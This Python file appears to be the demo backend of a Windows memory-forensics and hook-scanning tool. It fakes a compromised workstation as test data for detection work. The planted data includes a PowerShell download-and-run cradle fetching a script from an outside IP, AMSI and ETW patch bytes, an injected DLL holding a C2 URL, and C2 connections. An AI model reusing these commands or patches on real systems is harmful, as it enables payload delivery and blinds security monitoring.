"""
Demo backend: a simulated Windows workstation with a few planted
compromise indicators, so the interface can be explored on any OS.
All data flows through the same analysis / hook-scanning code as live mode.
"""

import struct

from . import analysis, hooks
from .synthpe import build_pe, map_image

A = analysis
SYS = "C:\\Windows\\System32\\"
NTDLL_BASE = 0x7FFE_A000_0000
AMSI_BASE = 0x7FFE_8000_0000
EDR_BASE = 0x7FFE_6000_0000
EDR_PATH = "C:\\Program Files\\Elastic\\Endpoint\\elastic-endpoint-hook64.dll"

SYSCALL = lambda n: bytes.fromhex("4c8bd1b8") + struct.pack("<I", n) + bytes.fromhex("f604250803fe7f017503 0f05c3cd2ec3".replace(" ", ""))
NTDLL_FUNCS = [
    ("NtAllocateVirtualMemory", SYSCALL(0x18)), ("NtProtectVirtualMemory", SYSCALL(0x50)),
    ("NtWriteVirtualMemory", SYSCALL(0x3A)), ("NtReadVirtualMemory", SYSCALL(0x3F)),
    ("NtCreateThreadEx", SYSCALL(0xC2)), ("NtMapViewOfSection", SYSCALL(0x28)),
    ("NtQuerySystemInformation", SYSCALL(0x36)), ("NtOpenProcess", SYSCALL(0x26)),
    ("EtwEventWrite", bytes.fromhex("4c8bdc4883ec58498363e800458bc8")),
    ("LdrLoadDll", bytes.fromhex("488bc4488958204c894018")),
    ("RtlGetVersion", bytes.fromhex("4053488d4c2408488bd90000000000000000000000000000")),
]
AMSI_FUNCS = [("AmsiScanBuffer", bytes.fromhex("4c8bdc49895b0849896b104989731857")),
              ("AmsiInitialize", bytes.fromhex("48895c2408574883ec20")),
              ("AmsiOpenSession", bytes.fromhex("4885d2742a4885c97425"))]
NTDLL_FILE, NTDLL_RVA = build_pe("ntdll.dll", NTDLL_FUNCS, 0x180000000, reloc_in=["RtlGetVersion"])
AMSI_FILE, AMSI_RVA = build_pe("amsi.dll", AMSI_FUNCS, 0x180000000)

EDR_HOOKED = ["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory",
              "NtCreateThreadEx", "NtMapViewOfSection", "NtReadVirtualMemory"]

#   pid, ppid, name, path, threads, edr_loaded
PROCS = [
    (4, 0, "System", "", 180, False),
    (388, 4, "smss.exe", SYS + "smss.exe", 2, False),
    (512, 500, "csrss.exe", SYS + "csrss.exe", 12, False),
    (600, 500, "wininit.exe", SYS + "wininit.exe", 3, False),
    (624, 600, "services.exe", SYS + "services.exe", 9, False),
    (640, 600, "lsass.exe", SYS + "lsass.exe", 11, True),
    (812, 624, "svchost.exe", SYS + "svchost.exe", 24, True),
    (868, 624, "svchost.exe", SYS + "svchost.exe", 15, True),
    (1032, 624, "svchost.exe", SYS + "svchost.exe", 40, True),
    (1188, 624, "svchost.exe", SYS + "svchost.exe", 8, True),
    (1420, 624, "spoolsv.exe", SYS + "spoolsv.exe", 10, True),
    (2104, 624, "elastic-endpoint.exe", "C:\\Program Files\\Elastic\\Endpoint\\elastic-endpoint.exe", 52, False),
    (2990, 500, "winlogon.exe", SYS + "winlogon.exe", 5, False),
    (3312, 3260, "explorer.exe", "C:\\Windows\\explorer.exe", 96, True),
    (4120, 3312, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 38, True),
    (4188, 4120, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", 17, True),
    (5216, 3312, "WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", 41, True),
    (5644, 5216, "powershell.exe", SYS + "WindowsPowerShell\\v1.0\\powershell.exe", 14, True),
    (6120, 3312, "svch0st.exe", "C:\\Users\\alex\\AppData\\Local\\Temp\\svch0st.exe", 6, True),
    (6408, 3312, "notepad.exe", SYS + "notepad.exe", 4, False),
    (7012, 6120, "rundll32.exe", SYS + "rundll32.exe", 3, True),
    (7400, 3312, "Code.exe", "C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", 30, True),
]
HIDDEN = {"pid": 6666, "name": "?", "path": "", "seen_by": ["PID brute force"]}
PROTECTED = {640}  # lsass runs as PPL in the demo → skipped like on a real host
INJECT_BASE = 0x1F0000


def _injected_payload():
    pe, _ = build_pe("stage2.dll", [("DllMain", bytes.fromhex("4883ec28b801000000"))])
    blob = bytearray(pe.ljust(0x3000, b"\x00"))
    for i, s in enumerate([b"http://45.142.212.61/gate.php?id=%s", b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                           b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", b"cmd.exe /c whoami /all"]):
        blob[0x2000 + i * 0x80:0x2000 + i * 0x80 + len(s)] = s
    return bytes(blob)


class DemoBackend:
    name = "demo"

    def __init__(self):
        self.proc_by_pid = {p[0]: p for p in PROCS}
        self.mem = {}       # pid -> list of (base, bytes)
        self.regs = {}      # pid -> regions
        self.mods = {}      # pid -> modules
        for p in PROCS:
            self._build(p)

    # ── synthetic process images ─────────────────────────────────────────
    def _build(self, p):
        pid, _, name, path, _, edr = p
        if pid == 4:
            return
        ntdll = bytearray(map_image(NTDLL_FILE, NTDLL_BASE))
        blobs = [(NTDLL_BASE, ntdll)]
        mods = [{"base": 0x7FF6_1000_0000 + pid * 0x10000, "size": 0x80000, "path": path, "name": name},
                {"base": NTDLL_BASE, "size": len(ntdll), "path": SYS + "ntdll.dll", "name": "ntdll.dll"},
                {"base": 0x7FFE_9000_0000, "size": 0xC0000, "path": SYS + "kernel32.dll", "name": "KERNEL32.DLL"}]
        regs = []

        def image(base, size):
            regs.extend([
                {"base": base, "size": 0x1000, "protect": 0x02, "type": A.MEM_IMAGE, "alloc_base": base, "mapped": ""},
                {"base": base + 0x1000, "size": size - 0x2000, "protect": 0x20, "type": A.MEM_IMAGE, "alloc_base": base, "mapped": ""},
                {"base": base + size - 0x1000, "size": 0x1000, "protect": 0x04, "type": A.MEM_IMAGE, "alloc_base": base, "mapped": ""}])

        if edr:
            mods.append({"base": EDR_BASE, "size": 0x60000, "path": EDR_PATH, "name": "elastic-endpoint-hook64.dll"})
            for fn in EDR_HOOKED:  # jmp rel32 into the EDR module
                at = NTDLL_RVA[fn]
                dest = EDR_BASE + 0x1000 + (at & 0xFFF) * 4
                ntdll[at:at + 5] = b"\xe9" + struct.pack("<i", dest - (NTDLL_BASE + at + 5))
        if name == "powershell.exe":
            at = NTDLL_RVA["EtwEventWrite"]
            ntdll[at] = 0xC3
            amsi = bytearray(map_image(AMSI_FILE, AMSI_BASE))
            at = AMSI_RVA["AmsiScanBuffer"]
            amsi[at:at + 6] = bytes.fromhex("b857000780c3")
            blobs.append((AMSI_BASE, amsi))
            mods.append({"base": AMSI_BASE, "size": len(amsi), "path": SYS + "amsi.dll", "name": "amsi.dll"})
            heap = bytearray(0x4000)
            for i, s in enumerate(["IEX (New-Object Net.WebClient).DownloadString('http://45.142.212.61/a.ps1')",
                                   "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
                                   "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"]):
                enc = s.encode("utf-16le")
                heap[0x100 + i * 0x200:0x100 + i * 0x200 + len(enc)] = enc
            blobs.append((0x2A0000, bytes(heap)))
            regs.append({"base": 0x2A0000, "size": len(heap), "protect": 0x04, "type": A.MEM_PRIVATE, "alloc_base": 0x2A0000, "mapped": ""})
        if name == "notepad.exe":
            payload = _injected_payload()
            blobs.append((INJECT_BASE, payload))
            regs.append({"base": INJECT_BASE, "size": len(payload), "protect": 0x20, "type": A.MEM_PRIVATE,
                         "alloc_base": INJECT_BASE, "mapped": ""})
            at = NTDLL_RVA["NtQuerySystemInformation"]
            dest = INJECT_BASE + 0x1000
            ntdll[at:at + 12] = b"\x48\xb8" + struct.pack("<Q", dest) + b"\xff\xe0"
        if name == "rundll32.exe":
            mods.append({"base": 0x6A40_0000, "size": 0x2D000, "path": "C:\\Users\\alex\\AppData\\Local\\Temp\\upd4te.dll",
                         "name": "upd4te.dll"})
        if name in ("chrome.exe", "Code.exe"):
            regs.append({"base": 0x3B00_0000_0000, "size": 0x40000, "protect": 0x40, "type": A.MEM_PRIVATE,
                         "alloc_base": 0x3B00_0000_0000, "mapped": ""})
        for m in mods:
            image(m["base"], max(m["size"], 0x3000))
        regs.append({"base": 0x10000 + pid * 0x100, "size": 0x20000, "protect": 0x04, "type": A.MEM_PRIVATE,
                     "alloc_base": 0x10000 + pid * 0x100, "mapped": ""})
        regs.append({"base": 0x7FFE0000, "size": 0x1000, "protect": 0x02, "type": A.MEM_PRIVATE,
                     "alloc_base": 0x7FFE0000, "mapped": ""})
        regs.append({"base": 0x1A0000, "size": 0x5000, "protect": 0x02, "type": A.MEM_MAPPED,
                     "alloc_base": 0x1A0000, "mapped": "\\Device\\HarddiskVolume3\\Windows\\System32\\locale.nls"})
        self.mem[pid] = blobs
        self.regs[pid] = sorted(regs, key=lambda r: r["base"])
        self.mods[pid] = mods

    # ── backend API ──────────────────────────────────────────────────────
    def system(self):
        return {"mode": "demo", "hostname": "WS-DEMO-042", "os": "Windows-10-10.0.22631-SP0 (simulated)",
                "admin": True, "debug_privilege": True, "python": "simulated", "self_pid": 9999, "root": "C:\\Windows"}

    def processes(self):
        base_t = 1_760_000_000
        out = []
        for i, (pid, ppid, name, path, threads, _) in enumerate(PROCS):
            out.append({"pid": pid, "ppid": ppid, "name": name, "threads": threads, "path": path,
                        "created": base_t + i * 60, "wow64": False,
                        "access": "kernel" if pid == 4 else ("limited" if pid in PROTECTED else "full")})
        return out

    def _check(self, pid):
        if pid not in self.regs:
            raise PermissionError(5, "Access is denied")
        if pid in PROTECTED:
            raise PermissionError(5, "Access is denied")

    def modules(self, pid):
        self._check(pid)
        return [dict(m) for m in self.mods[pid]]

    def regions(self, pid):
        self._check(pid)
        return [dict(r) for r in self.regs[pid]]

    def region_at(self, pid, addr):
        for r in self.regs.get(pid, []):
            if r["base"] <= addr < r["base"] + r["size"]:
                return dict(r)
        return None

    def read(self, pid, addr, size):
        for base, blob in self.mem.get(pid, []):
            if base <= addr < base + len(blob):
                return bytes(blob[addr - base:addr - base + size])
        r = self.region_at(pid, addr)
        return bytes(min(size, r["base"] + r["size"] - addr)) if r else b""

    def read_file(self, path):
        name = path.lower().rsplit("\\", 1)[-1]
        if name == "ntdll.dll":
            return NTDLL_FILE
        if name == "amsi.dll":
            return AMSI_FILE
        raise FileNotFoundError(path)

    def scan_hooks(self, pid, wanted=None, modules=None):
        self._check(pid)
        return hooks.scan(self, pid, modules or self.mods[pid], wanted)

    def hidden(self):
        return [dict(HIDDEN)]

    def connections(self):
        def c(proto, l, lp, r, rp, st, pid):
            fmt = lambda ip, p: f"{ip}:{p}"
            return {"proto": proto, "local_ip": l, "local_port": lp, "remote_ip": r, "remote_port": rp,
                    "local": fmt(l, lp), "remote": "*" if r == "*" else fmt(r, rp), "state": st, "pid": pid}
        return [
            c("tcp", "0.0.0.0", 135, "0.0.0.0", 0, "LISTENING", 868),
            c("tcp", "0.0.0.0", 445, "0.0.0.0", 0, "LISTENING", 4),
            c("tcp", "10.0.4.42", 51544, "142.250.201.14", 443, "ESTABLISHED", 4188),
            c("tcp", "10.0.4.42", 51562, "52.113.194.132", 443, "ESTABLISHED", 3312),
            c("tcp", "10.0.4.42", 51571, "45.142.212.61", 443, "ESTABLISHED", 5644),
            c("tcp", "10.0.4.42", 51580, "91.215.85.17", 4444, "ESTABLISHED", 6120),
            c("tcp", "10.0.4.42", 51583, "185.161.248.20", 8443, "ESTABLISHED", 7012),
            c("tcp", "10.0.4.42", 51590, "193.42.33.7", 8081, "ESTABLISHED", 6666),
            c("tcp", "10.0.4.42", 51602, "10.0.4.10", 445, "ESTABLISHED", 4),
            c("tcp", "127.0.0.1", 9229, "0.0.0.0", 0, "LISTENING", 7400),
            c("udp", "0.0.0.0", 5353, "*", 0, "", 4120),
            c("udp", "0.0.0.0", 123, "*", 0, "", 1188),
        ]
